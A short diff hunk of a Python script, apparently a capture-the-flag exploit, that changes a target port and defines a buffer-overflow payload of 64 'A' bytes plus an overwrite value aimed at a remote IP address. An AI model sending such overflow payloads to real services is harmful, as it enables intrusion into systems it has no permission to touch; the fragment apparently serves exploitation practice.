@@ -3,7 +3,7 @@
 import socket
 
 HOST = "104.236.80.67"
-PORT = 5681
+PORT = 5690
 payload = "A"*64 + "\x37\x13\x37\x13\n"
 
 def main():
